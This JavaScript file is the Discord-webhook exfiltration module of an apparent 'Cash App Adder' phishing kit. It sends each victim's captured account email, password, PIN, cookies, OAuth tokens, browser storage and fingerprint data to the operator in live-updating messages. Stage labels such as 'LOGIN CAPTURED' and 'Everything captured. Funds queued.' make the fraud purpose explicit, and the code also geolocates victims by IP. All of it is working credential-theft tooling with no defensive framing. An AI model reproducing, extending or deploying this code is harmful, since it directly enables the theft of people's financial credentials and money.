/* ============================================================
   api/_discord.js
   Discord webhook delivery for Cash App Adder.

   - One live message per victim, rewritten in place
   - Rate-limit aware (429 + retry_after, 4 attempts)
   - Raw JSON session dump attached on completion
   - Free IP geolocation, no API key
   - Zero dependencies

   ENV:
     DISCORD_WEBHOOK     required
     DISCORD_MODE        live (default) | verbose
     DISCORD_FORMAT      embed (default) | text
     DISCORD_PING        @here | @everyone | <@userid>  (final only)
     DISCORD_ON_LOAD     true | false (default)
     DISCORD_THREAD_ID   optional thread / forum channel
     DISCORD_USERNAME    display name override
     DISCORD_AVATAR      avatar url override
   ============================================================ */

const API = 'https://discord.com/api/v10';

const GREEN  = 0x00d54b;
const AMBER  = 0xffb400;
const RED    = 0xe74c3c;
const BLUE   = 0x00b0ff;
const PURPLE = 0x9b59b6;
const GREY   = 0x5c6b62;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/* ---------- webhook url parsing ---------- */
function hook() {
  const raw = process.env.DISCORD_WEBHOOK;
  if (!raw) return null;
  let u;
  try { u = new URL(raw); } catch { return null; }
  const seg = u.pathname.split('/').filter(Boolean);
  if (seg.length < 2) return null;
  return {
    base: API + '/webhooks/' + seg[0] + '/' + seg[1],
    thread: process.env.DISCORD_THREAD_ID || u.searchParams.get('thread_id') || null,
  };
}

/* ---------- transport ---------- */
async function call(method, path, payload, opts) {
  opts = opts || {};
  const h = hook();
  if (!h) return null;

  let url = h.base + path;
  const q = [];
  if (h.thread) q.push('thread_id=' + encodeURIComponent(h.thread));
  if (opts.wait) q.push('wait=true');
  if (q.length) url += '?' + q.join('&');

  for (let attempt = 0; attempt < 4; attempt++) {
    let res;
    try {
      res = await fetch(url, {
        method: method,
        headers: opts.form ? undefined : { 'Content-Type': 'application/json' },
        body: opts.form || (payload ? JSON.stringify(payload) : undefined),
      });
    } catch (e) {
      console.error('[discord] network:', e.message);
      await sleep(350 * (attempt + 1));
      continue;
    }

    if (res.status === 429) {
      const j = await res.json().catch(() => ({}));
      const wait = Math.ceil((j.retry_after || 1) * 1000) + 300;
      console.warn('[discord] rate limited, retrying in', wait, 'ms');
      await sleep(wait);
      continue;
    }

    if (!res.ok) {
      console.error('[discord]', res.status, (await res.text().catch(() => '')).slice(0, 300));
      return null;
    }

    if (res.status === 204) return { id: null, ok: true };
    return res.json().catch(() => ({ id: null, ok: true }));
  }

  console.error('[discord] gave up after 4 attempts');
  return null;
}

export function createMessage(payload) {
  return call('POST', '', payload, { wait: true });
}

export function editMessage(id, payload) {
  return call('PATCH', '/messages/' + id, payload);
}

export function postWithFile(payload, filename, text) {
  const fd = new FormData();
  fd.append('payload_json', JSON.stringify(payload));
  fd.append('files[0]', new Blob([text], { type: 'application/json' }), filename);
  return call('POST', '', null, { form: fd, wait: true });
}

/* ---------- stage presentation ---------- */
export function stageMeta(stage) {
  const M = {
    landed:           { t: '👀 Landed on the page',      c: AMBER,  d: 'Not started yet.' },
    started:          { t: '🟢 SESSION STARTED',          c: AMBER,  d: 'Visitor hit Try This Out.' },
    login:            { t: '🔑 LOGIN CAPTURED',           c: AMBER,  d: 'Account + password submitted.' },
    verify:           { t: '⏳ Verifying',                c: AMBER,  d: 'Handshake in progress.' },
    pin:              { t: '🔢 PIN CAPTURED',             c: BLUE,   d: 'PIN gate accepted.' },
    fingerprint:      { t: '🧬 FINGERPRINT DUMPED',       c: PURPLE, d: 'Cookies, storage, canvas, WebGL.' },
    cookie_update:    { t: '🍪 Cookie update',            c: PURPLE, d: 'Cookies changed mid-session.' },
    done:             { t: '✅ COMPLETE — FULL SESSION',  c: GREEN,  d: 'Everything captured. Funds queued.' },
    unload:           { t: '🚪 Tab closed',               c: GREY,   d: 'Visitor left.' },
    oauth_token_ok:   { t: '🔐 OAUTH TOKEN ISSUED',       c: GREEN,  d: 'access_token + refresh_token returned.' },
    oauth_token_fail: { t: '⚠️ OAUTH TOKEN FAILED',       c: RED,    d: 'Code exchange rejected.' },
  };
  return M[stage] || { t: '• ' + stage, c: AMBER, d: '' };
}

/* ---------- helpers ---------- */
function device(ua) {
  ua = ua || '';
  const os = /iPhone/.test(ua) ? 'iOS'
    : /iPad/.test(ua) ? 'iPadOS'
    : /Android/.test(ua) ? 'Android'
    : /Windows/.test(ua) ? 'Windows'
    : /Mac OS X/.test(ua) ? 'macOS'
    : /Linux/.test(ua) ? 'Linux' : 'Unknown';
  const br = /Edg\//.test(ua) ? 'Edge'
    : /OPR\//.test(ua) ? 'Opera'
    : /Chrome\//.test(ua) ? 'Chrome'
    : /Safari\//.test(ua) ? 'Safari'
    : /Firefox\//.test(ua) ? 'Firefox' : 'Browser';
  return os + ' · ' + br;
}

function mono(v, max) {
  return '`' + String(v).replace(/`/g, "'").slice(0, max || 1000) + '`';
}

function block(v, max) {
  return '```' + String(v).slice(0, max || 980) + '```';
}

/* ---------- payload builders ---------- */
export function buildPayload(row, meta, geo, ping) {
  const f = [];

  if (row.email)    f.push({ name: '👤 Account',  value: mono(row.email),    inline: true });
  if (row.password) f.push({ name: '🔑 Password', value: mono(row.password), inline: true });
  if (row.pin)      f.push({ name: '🔢 PIN',      value: mono(row.pin),      inline: true });
  if (row.sid)      f.push({ name: '🆔 Session',  value: mono(row.sid.slice(0, 10)), inline: true });
  if (row.ip)       f.push({ name: '🌐 IP',       value: mono(row.ip),       inline: true });
  if (row.ua)       f.push({ name: '📱 Device',   value: mono(device(row.ua)), inline: true });
  if (geo)          f.push({ name: '📍 Location', value: mono(geo),          inline: false });
  if (row.cookies)  f.push({ name: '🍪 Cookie',   value: block(row.cookies), inline: false });

  if (row.oauth) {
    f.push({ name: '🔐 OAuth Tokens', value: block(JSON.stringify(row.oauth, null, 1), 950), inline: false });
  }
  if (row.localStorage && Object.keys(row.localStorage).length) {
    f.push({ name: '💾 localStorage', value: block(JSON.stringify(row.localStorage), 950), inline: false });
  }
  if (row.sessionStorage && Object.keys(row.sessionStorage).length) {
    f.push({ name: '📦 sessionStorage', value: block(JSON.stringify(row.sessionStorage), 950), inline: false });
  }
  if (row.canvas) f.push({ name: '🎨 Canvas FP', value: mono(row.canvas, 900), inline: false });
  if (row.webgl)  f.push({ name: '🖥️ GPU',       value: mono(row.webgl, 900),  inline: false });

  return {
    username: process.env.DISCORD_USERNAME || 'Cash App Adder',
    avatar_url: process.env.DISCORD_AVATAR || undefined,
    content: ping || undefined,
    embeds: [{
      title: meta.t,
      description: meta.d,
      color: meta.c,
      fields: f.slice(0, 25),
      footer: {
        text: 'sid ' + (row.sid ? row.sid.slice(0, 8) : 'anon') + ' · ' + (row.received || new Date().toISOString()),
      },
      timestamp: new Date().toISOString(),
    }],
    allowed_mentions: { parse: ['everyone', 'users', 'roles'] },
  };
}

export function buildText(row, meta, geo, ping) {
  const L = [
    '**' + meta.t + '**',
    '```',
    'Account  : ' + (row.email || '-'),
    'Password : ' + (row.password || '-'),
    'PIN      : ' + (row.pin || '-'),
    'Cookie   : ' + (row.cookies || '-').slice(0, 180),
    'IP       : ' + (row.ip || '-') + (geo ? '   (' + geo + ')' : ''),
    'Device   : ' + device(row.ua || ''),
    'Session  : ' + (row.sid || '-'),
    '```',
  ];
  return {
    username: process.env.DISCORD_USERNAME || 'Cash App Adder',
    avatar_url: process.env.DISCORD_AVATAR || undefined,
    content: (ping ? ping + '\n' : '') + L.join('\n'),
    allowed_mentions: { parse: ['everyone', 'users', 'roles'] },
  };
}

/* ---------- geolocation (ipwho.is, free, no key) ---------- */
const geoC = globalThis.__geoC || (globalThis.__geoC = new Map());

export async function geoLookup(ip) {
  if (!ip || ip === '::1' || /^(10\.|192\.168\.|127\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)) return null;
  if (geoC.has(ip)) return geoC.get(ip);

  try {
    const ctl = new AbortController();
    const to = setTimeout(() => ctl.abort(), 2200);
    const r = await fetch('https://ipwho.is/' + ip, { signal: ctl.signal });
    clearTimeout(to);
    const j = await r.json();
    if (!j.success) throw new Error('lookup failed');
    const out = [j.city, j.region, j.country].filter(Boolean).join(', ')
      + (j.connection && j.connection.isp ? ' · ' + j.connection.isp : '');
    geoC.set(ip, out);
    return out;
  } catch {
    geoC.set(ip, null);
    return null;
  }
}
